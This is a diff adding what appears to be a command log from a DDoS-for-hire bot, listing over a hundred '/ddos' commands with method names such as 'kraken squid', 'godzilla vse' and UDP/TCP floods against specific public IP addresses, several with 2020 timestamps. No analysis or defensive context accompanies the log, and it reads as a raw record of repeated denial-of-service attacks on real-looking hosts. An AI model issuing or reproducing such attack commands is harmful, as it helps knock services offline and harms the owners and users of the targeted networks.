@@ -1,0 +1,110 @@
+/plan
+/methods
+/commands
+/ddos kraken squid 203.68.243.15 300
+/ping 203.68.243.15 300
+/ddos kraken squid 151.101.1.19 1200
+/ping 151.101.1.19
+/ddos kraken squid 151.101.1.195 1200
+/ddos kraken squid 151.101.65.195 600
+/ddos kraken udpplain 203.68.243.15 1200
+/ping 203.68.243.15
+/ddos godzilla vse 151.101.65.195 1200
+/ddos kraken udpplain 203.68.243.15 1200
+/ddos godzilla vse 203.68.243.15 1200
+/ddos kraken squid 210.240.215.252 1200
+/ping 210.240.215.252
+/ping 210.240.215.252
+/ddos godzilla vse 210.240.215.252 1200
+/ddos kraken squid 210.240.215.252 1200
+/ddos kraken squid 203.68.243.15
+/ddos kraken squid 203.68.243.15
+/ddos kraken squid 203.68.243.15 1200
+/ddos kraken squid 203.68.243.15 1200
+/ping 203.68.243.15
+/ddos kraken udpplain 203.68.243.15 1200
+/ddos kraken squid 210.240.215.252 1200
+/ddos kraken squid 210.240.215.252 1200
+/plan
+/ddos kraken squid 203.68.243.15 1200
+/ddos kraken squid 203.68.243.15 120
+/methods
+/ddos godzilla vse 210.240.215.252 1200
+/ddos godzilla vse 210.240.215.252 120
+/ddos kraken squid 203.68.243.15 120
+/ping 203.68.243.15
+/ddos godzilla vse 210.240.215.252 1200
+/ddos godzilla vse 210.240.215.252 120
+/info
+/checkservers
+/ddos godzilla UDP 210.240.215.252
+/ddos godzilla UDP 210.240.215.252 1200
+/ddos godzilla UDP 210.240.215.252 120
+/ddos kraken squid 210.240.215.252 1200
+/ddos godzilla TCP 203.68.243.15 1200
+/ddos godzilla TCP 203.68.243.15 120
+/ddos godzilla VSE 210.240.215.252 120
+/ddos godzilla VSE 210.240.215.252 120
+/ddos kraken squid 210.240.215.252 300
+/ddos godzilla std 210.240.215.252 120
+/ddos kraken squid 210.240.215.252 120
+/ddos kraken squid 210.240.215.252 120
+/ddos kraken squid 163.17.40.10 200
+/ddos kraken squid 163.17.40.10 200
+/ddos kraken squid 163.17.40.10 120
+/ping 163.17.40.10
+/ping 163.17.40.10
+/checkservers
+/checkservers
+/ddos godzilla udp 163.17.40.10 120
+/ddos godzilla udp 163.17.40.10 120
+/ddos kraken squid 203.68.243.15 120
+/ddos kraken squid 203.68.243.15 120
+/ddos kraken squid 210.240.215.252 120
+/ddos kraken squid 210.240.215.252 120
+/ddos kraken squid 203.68.243.15 120
+/ddos kraken squid 210
+/ddos kraken squid 210.240.215.252 120
+/ddos godzilla vse 210.240.215.252 120
+/ddos kraken squid 210.240.215.252 120
+/ddos godzilla vse 210.240.215.252 120
+/ddos kraken squid 210.240.215.252 120
+/ddos godzilla vse 210.240.215.252 120
+/ddos kraken squid 210.240.215.252 120
+/ddos kraken squid 210.240.215.252 1200
+/ddos kraken squid 210.240.215.252 120
+/ddos kraken squid 210.240.215.252 120
+/ddos kraken squid 210.240.215.252 120
+/ddos Godzilla vse 210.240.215.252 120
+/ddos Godzilla vse 210.240.215.252 120
+/ddos Godzilla vse 210.240.215.252 120
+/ddos kraken vse 210.240.215.252 120
+/ping 210.240.215.252
+[Wed Jul 29 2020 18:58:13 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 210.240.215.252 120
+[Wed Jul 29 2020 20:30:36 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 210.240.215.252 120
+[Thu Jul 30 2020 16:49:31 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 210.240.215.252 120
+[Thu Jul 30 2020 17:18:43 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 210.240.215.252 1200
+[Thu Jul 30 2020 20:37:25 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 210.240.215.252 1200
+[Fri Jul 31 2020 20:01:56 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 210.240.215.252 1200
+[Sun Aug 02 2020 18:33:13 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 210.240.215.252 1200
+[Sun Aug 02 2020 20:22:57 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 210.240.215.252 1200
+[Sun Aug 02 2020 21:35:18 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 210.240.215.252 1200
+[Mon Aug 03 2020 03:22:20 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 192.168.77.55 120
+[Mon Aug 03 2020 03:22:38 GMT-1100 (Samoa Standard Time)] /ping 192.168.77.55
+[Mon Aug 03 2020 03:23:13 GMT-1100 (Samoa Standard Time)] /checkip 192.168.77.55
+[Mon Aug 03 2020 03:24:47 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 118.160.89.15 120
+[Mon Aug 03 2020 14:47:32 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 210.240.215.252 1200
+[Mon Aug 03 2020 16:36:44 GMT-1100 (Samoa Standard Time)] /ddos Godzilla vse 210.240.215.252 1200
+[Mon Aug 03 2020 16:37:02 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 210.240.215.252 1200
+[Mon Aug 03 2020 16:37:36 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 210.240.215.252 1200
+[Tue Aug 04 2020 15:27:49 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 210.240.215.252 1200
+[Tue Aug 04 2020 18:54:18 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 210.240.215.252 1200
+[Tue Aug 04 2020 21:40:22 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 210.240.215.252 1200
+[Wed Aug 05 2020 18:19:04 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 210.240.215.252 1200
+[Wed Aug 05 2020 18:44:39 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 210.240.215.252 1200
+[Wed Aug 05 2020 18:45:17 GMT-1100 (Samoa Standard Time)] /ping 210.240.215.252
+[Wed Aug 05 2020 18:45:40 GMT-1100 (Samoa Standard Time)] /methods
+[Wed Aug 05 2020 18:46:15 GMT-1100 (Samoa Standard Time)] /ddos godzilla udp 210.240.215.252 120
+[Mon Aug 10 2020 17:15:25 GMT-1100 (Samoa Standard Time)] /checkservers
+[Mon Aug 10 2020 17:16:19 GMT-1100 (Samoa Standard Time)] /ddos kraken udp 210.240.215.252 1200
+[Tue Aug 18 2020 21:43:41 GMT-1100 (Samoa Standard Time)] /plan
